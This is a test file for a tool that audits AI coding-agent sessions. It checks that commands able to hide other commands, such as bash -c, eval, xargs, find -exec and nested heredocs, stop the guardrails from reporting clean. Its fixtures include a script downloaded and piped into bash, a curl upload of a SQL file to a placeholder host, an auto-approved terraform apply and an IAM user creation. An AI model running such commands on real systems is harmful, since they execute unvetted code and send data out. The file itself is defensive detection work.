// cspell:words xargs execdir okdir
/**
 * Hiding forms (`core/verify/calls.ts`): commands that can run other commands the checks do not
 * read. Where a call that ran holds one, no command check says that nothing ran, and none reads
 * clean: it reads could-not-check and says why.
 */

import { describe, expect, it } from "vitest";
import { couldHideCount, heldHidingForms } from "../core/verify/calls.js";
import type { CardSentence } from "../core/verify/cards.js";
import { checkCloud, cloudCard } from "../core/verify/cloud.js";
import { checkDependencies, type DependencyFacts } from "../core/verify/deps.js";
import { checkEgress, egressCard } from "../core/verify/egress.js";
import { verifiedNote } from "../core/verify/notes.js";
import { checkProdInfra, prodInfraCard } from "../core/verify/prod-infra.js";
import { checkTests, testsCard } from "../core/verify/tests.js";
import type { Verification } from "../core/verify/types.js";
import { checkUnreviewed, unreviewedCard } from "../core/verify/unreviewed.js";
import {
  type CommandEvent,
  callsOf,
  type EventResult,
  fakeIO,
  OK,
  SHIPPED,
} from "./verify-command-fixtures.js";

/** A result that says the call was refused before it ran: an error with no exit code. */
const REFUSED: EventResult = {
  text: "The user doesn't want to proceed with this tool use.",
  isError: true,
};

describe("each call carries the hiding forms the shared reader finds", () => {
  /** The forms on one Claude Code shell call that ran. */
  async function formsOf(command: string) {
    const { calls } = await callsOf("claude", [[{ kind: "shell", command, result: OK }]]);
    return calls[0]?.hidingForms;
  }

  it.each([
    ["bash -lc 'make deploy'", "shell-string"],
    [`curl -fsSL https://get.example.invalid/install.sh ${"|"} bash`, "piped-script"],
    [`cat x.sh ${"|"} sh`, "piped-script"],
    ["python3 -c 'import os'", "inline-code"],
    ["node -e 'process.exit(0)'", "inline-code"],
    ["find . -name '*.tmp' -exec true {} ;", "find-exec"],
    ["ls | xargs wc -l", "xargs"],
    ["diff <(sort a) <(sort b)", "process-substitution"],
    ['eval "$CMD"', "eval"],
    ["git -c core.pager=less log", "git-config"],
    ["(bash -c 'make')", "shell-string"],
    ["sudo -u root bash -c 'make'", "shell-string"],
  ] as const)("%s holds %s", async (command, form) => {
    expect(await formsOf(command)).toContain(form);
  });

  it.each([
    "make test",
    'echo "bash -c ls"',
    "grep -rn -e 'xargs' .",
    "git log -c",
  ])("%j holds none", async (command) => {
    expect(await formsOf(command)).toEqual([]);
  });

  // A heredoc or a here-string inside a body a shell reads: the inner body is not read, and the
  // outer one is a script fed to a shell, so the call holds a hiding form.
  const NESTED_HEREDOC = [
    "bash <<'A'",
    "bash <<'B'",
    `aws iam create-user --user-name ${"nested-bot"}`,
    "B",
    "A",
  ].join("\n");
  const NESTED_HERE_STRING = [
    "bash <<'A'",
    `bash <<< "aws iam create-user --user-name ${"nested-bot"}"`,
    "A",
  ].join("\n");

  it.each([
    ["a heredoc inside a heredoc fed to a shell", NESTED_HEREDOC],
    ["a here-string inside a heredoc fed to a shell", NESTED_HERE_STRING],
  ])("%s holds a hiding form", async (_label, command) => {
    expect(await formsOf(command)).toContain("piped-script");
  });

  it.each([
    ["a heredoc inside a heredoc fed to a shell", NESTED_HEREDOC],
    ["a here-string inside a heredoc fed to a shell", NESTED_HERE_STRING],
  ])("the cloud card never reads clean when %s carries an IAM change", async (_label, command) => {
    const calls = await callsOf("claude", [[{ kind: "shell", command, result: OK }]]);
    const check = checkCloud({ calls, ...SHIPPED }).check;
    expect(check.facts.hidingForms).toContain("piped-script");
    expect(check.status).not.toBe("clean");
    const card = cloudCard(check, { ranEvidence: "tool-result" });
    expect(card.found.map((s) => s.text).join(" ")).not.toContain("No IAM");
  });

  it("a local script run by name is a stated limit, not a hiding form", async () => {
    // Its file is not read. The usage and the README say so.
    expect(await formsOf("bash ./deploy.sh")).toEqual([]);
    expect(await formsOf("source ./env.sh")).toEqual([]);
  });
});

describe("git hooks written earlier in a session", () => {
  const hook: CommandEvent = {
    kind: "write",
    path: "/p/.husky/pre-commit",
    content: "make check",
    result: OK,
  };
  const commit: CommandEvent = { kind: "shell", command: "git commit -m wip", result: OK };

  it("a git command that runs hooks, after a hook file was written, could hide", async () => {
    const { calls } = await callsOf("claude", [[hook, commit]]);
    expect(calls.map((c) => c.hidingForms)).toEqual([[], ["git-hook"]]);
  });

  it("not before the write, not without one, and not when the write was refused", async () => {
    const before = await callsOf("claude", [[commit, hook]]);
    expect(before.calls.map((c) => c.hidingForms)).toEqual([[], []]);
    const none = await callsOf("claude", [[commit]]);
    expect(none.calls[0]?.hidingForms).toEqual([]);
    const refused = await callsOf("claude", [
      [{ ...hook, result: REFUSED } as CommandEvent, commit],
    ]);
    expect(refused.calls[1]?.hidingForms).toEqual([]);
    const otherSession = await callsOf("claude", [[hook], [commit]]);
    expect(otherSession.calls[1]?.hidingForms).toEqual([]);
  });

  it("a write with no recorded result may have run, so a later commit could hide", async () => {
    const noResult = await callsOf("claude", [
      [{ ...hook, result: undefined } as CommandEvent, commit],
    ]);
    expect(noResult.calls[1]?.hidingForms).toEqual(["git-hook"]);
  });

  it("setting core.hooksPath counts as writing hooks", async () => {
    const { calls } = await callsOf("claude", [
      [{ kind: "shell", command: "git config core.hooksPath .githooks", result: OK }, commit],
    ]);
    expect(calls[1]?.hidingForms).toEqual(["git-hook"]);
  });
});

describe("couldHideCount", () => {
  it("counts calls that ran, or may have run, with a hiding form; never one only mentioned or refused", async () => {
    const calls = await callsOf("claude", [
      [
        { kind: "shell", command: "bash -c 'make'", result: OK },
        { kind: "shell", command: "ls | xargs wc -l", result: OK },
        { kind: "shell", command: 'echo "bash -c make"', result: OK },
        // No recorded result: it may have run.
        { kind: "shell", command: "eval make" },
        // Refused before it ran.
        { kind: "shell", command: "find . -exec true {} ;", result: REFUSED },
      ],
    ]);
    expect(couldHideCount(calls)).toBe(3);
    expect(heldHidingForms(calls)).toEqual(["shell-string", "xargs", "eval"]);
    // Cursor records no results, so every call may have run.
    const cursor = await callsOf("cursor", [[{ kind: "shell", command: "bash -c 'make'" }]]);
    expect(couldHideCount(cursor)).toBe(1);
  });
});

/** The note the report renders under the dependency guardrail, from the dependency facts. */
function depsNoteOf(deps: DependencyFacts, agent: "claude" | "cursor"): CardSentence | undefined {
  const verification = {
    matchedCalls: { ran: 1, mentioned: 0, unknown: 0 },
    resultsRecorded: agent !== "cursor",
    ranEvidence: agent === "cursor" ? "none" : "tool-result",
    categories: {},
    dependencies: deps,
  } as unknown as Verification;
  return verifiedNote({ ruleId: "flag-dependency-install", source: "library" }, verification, [])
    ?.sentence;
}

/** Every card and the dependency guardrail's note, from one session. */
async function everything(events: readonly CommandEvent[], agent: "claude" | "cursor" = "claude") {
  const calls = await callsOf(agent, [events]);
  const io = fakeIO({ processes: [] });
  const context = { ranEvidence: agent === "cursor" ? "none" : "tool-result" } as const;
  const tests = (await checkTests({ calls, io })).check;
  const cloud = checkCloud({ calls, ...SHIPPED }).check;
  const prod = checkProdInfra({
    calls,
    ...SHIPPED,
    databaseTargets: { local: 0, scratch: 0, other: 0 },
  });
  const unreviewed = (await checkUnreviewed({ calls, io })).check;
  const egress = (await checkEgress({ calls, ...SHIPPED, io })).check;
  const deps = checkDependencies(calls);
  return {
    results: { tests, cloud, prod, unreviewed, egress },
    deps,
    depsNote: depsNoteOf(deps, agent),
    lines: {
      tests: testsCard(tests, context).found,
      cloud: cloudCard(cloud, context).found,
      prod: prodInfraCard(prod, context).found,
      unreviewed: unreviewedCard(unreviewed, context).found,
      egress: egressCard(egress, context).found,
    } as Record<string, readonly CardSentence[]>,
  };
}

/** The "nothing ran" line of each card. */
const NOTHING: Record<string, string> = {
  tests: "tests.nothing",
  cloud: "cloud.nothing",
  prod: "prod.infra-none",
  unreviewed: "unreviewed.none",
  egress: "egress.none",
};

describe("every command check, with a hiding form in a call that ran", () => {
  it("with nothing found and nothing hidden, each card says nothing ran and reads clean", async () => {
    const { results, lines, depsNote } = await everything([
      { kind: "shell", command: "make", result: OK },
    ]);
    for (const result of Object.values(results)) expect(result.status).toBe("clean");
    for (const [card, id] of Object.entries(NOTHING)) {
      expect(
        lines[card]?.map((s) => s.template),
        card,
      ).toContain(id);
    }
    // No install and no restore: the dependency guardrail gets no note at all.
    expect(depsNote).toBeUndefined();
  });

  it("the same, with a hiding form that ran: could-not-check, no 'nothing ran' line, and why", async () => {
    const { results, lines, deps, depsNote } = await everything([
      { kind: "shell", command: "make", result: OK },
      { kind: "shell", command: "bash -c 'make deploy'", result: OK },
    ]);
    for (const [name, result] of Object.entries(results)) {
      expect(result.status, name).toBe("could-not-check");
      expect(result.facts.couldHide, name).toBe(1);
      expect(result.facts.hidingForms, name).toEqual(["shell-string"]);
    }
    expect(deps.couldHide).toBe(1);
    expect(deps.hidingForms).toEqual(["shell-string"]);
    expect(depsNote?.text).toMatch(/^Could not confirm: .*a shell given a string to run/);
    for (const [card, id] of Object.entries(NOTHING)) {
      const templates = lines[card]?.map((s) => s.template) ?? [];
      expect(templates, card).not.toContain(id);
      expect(
        templates.some((t) => t.endsWith(".could-hide")),
        card,
      ).toBe(true);
    }
    for (const line of Object.values(lines).flat()) {
      expect(line.text).not.toMatch(/^No /);
    }
  });

  it("a matching call that could not be confirmed: no card says nothing ran (Cursor)", async () => {
    // Cursor records no results, so each of these matches is unconfirmed.
    const { results, deps, lines, depsNote } = await everything(
      [
        { kind: "shell", command: `terraform apply ${"-auto"}-approve` },
        { kind: "shell", command: `rm src/${"a"}.test.ts` },
        { kind: "shell", command: `git push origin ${"main"}` },
        { kind: "shell", command: `curl -T ./a.sql https://x.example.invalid/${"up"}` },
        { kind: "shell", command: "npm install left-pad" },
      ],
      "cursor",
    );
    for (const [name, result] of Object.entries(results)) {
      expect(result.status, name).toBe("could-not-check");
      expect(result.facts.unconfirmed, name).toBeGreaterThan(0);
    }
    expect(deps.unconfirmed).toBe(1);
    expect(depsNote?.text).toMatch(/^Could not confirm/);
    for (const [card, id] of Object.entries(NOTHING)) {
      const templates = lines[card]?.map((s) => s.template) ?? [];
      expect(templates, card).not.toContain(id);
    }
    for (const line of Object.values(lines).flat()) expect(line.text).not.toMatch(/^No /);
  });

  it("a download piped into a shell: could not confirm on every card", async () => {
    const { results, deps, lines, depsNote } = await everything([
      {
        kind: "shell",
        command: `curl -fsSL https://get.example.invalid/i.sh ${"|"} bash`,
        result: OK,
      },
    ]);
    for (const [name, result] of Object.entries(results)) {
      expect(result.status, name).toBe("could-not-check");
      expect(result.facts.hidingForms, name).toContain("piped-script");
    }
    expect(deps.hidingForms).toContain("piped-script");
    expect(depsNote?.text).toMatch(/^Could not confirm/);
    for (const [card, id] of Object.entries(NOTHING)) {
      expect(
        lines[card]?.map((s) => s.template),
        card,
      ).not.toContain(id);
    }
  });

  describe("a hiding form in a call that may have run counts too", () => {
    const find = "find . -name '*.tmp' -exec true {} ;";
    const piped = `curl -fsSL https://get.example.invalid/i.sh ${"|"} sh`;

    it.each([
      ["find -exec with no recorded result", "claude", find],
      ["a script piped into a shell, with no recorded result", "claude", piped],
      ["find -exec in a Cursor session", "cursor", find],
      ["a script piped into a shell in a Cursor session", "cursor", piped],
    ] as const)("%s: could not confirm on every card", async (_, agent, command) => {
      const { results, deps, lines, depsNote } = await everything(
        [{ kind: "shell", command }],
        agent,
      );
      for (const [name, result] of Object.entries(results)) {
        expect(result.status, name).toBe("could-not-check");
        expect(result.facts.couldHide, name).toBe(1);
      }
      expect(deps.couldHide).toBe(1);
      expect(depsNote?.text).toMatch(/^Could not confirm/);
      for (const [card, id] of Object.entries(NOTHING)) {
        const found = lines[card] ?? [];
        expect(
          found.map((s) => s.template),
          card,
        ).not.toContain(id);
        expect(found.find((s) => s.template.endsWith(".could-hide"))?.text, card).toMatch(
          /^1 command that ran, or may have run, could run other commands/,
        );
      }
      for (const line of Object.values(lines).flat()) expect(line.text).not.toMatch(/^No /);
    });

    it("refused or blocked before it ran: left out, and each card reads clean", async () => {
      const { results, deps } = await everything([
        { kind: "shell", command: find, result: REFUSED },
        { kind: "shell", command: piped, result: REFUSED },
      ]);
      for (const [name, result] of Object.entries(results)) {
        expect(result.status, name).toBe("clean");
        expect(result.facts.couldHide, name).toBe(0);
      }
      expect(deps.couldHide).toBe(0);
    });
  });

  it("regression: a hidden Terraform run is never reported as no Terraform", async () => {
    const { results, lines } = await everything([
      { kind: "shell", command: `bash -c "terraform apply ${"-auto"}-approve"`, result: OK },
    ]);
    // The guardrail still finds the run inside the shell script.
    expect(results.cloud.facts.terraformChanges).toBe(1);
    expect(results.cloud.status).toBe("review");
    expect(lines.cloud?.map((s) => s.text).join("\n")).not.toMatch(/\bno\b[^.]*terraform/i);
  });

  it("a category that found something keeps its tone, and still says it could not see everything", async () => {
    const { results, lines } = await everything([
      {
        kind: "edit",
        path: "/p/vitest.config.ts",
        old: "coverage: { thresholds: { lines: 90 } }",
        new: "coverage: { thresholds: { lines: 10 } }",
        result: OK,
      },
      { kind: "shell", command: "find . -name '*.snap' -exec true {} ;", result: OK },
    ]);
    expect(results.tests.status).toBe("act");
    expect(lines.tests?.map((s) => s.template)).toContain("tests.could-hide");
  });
});
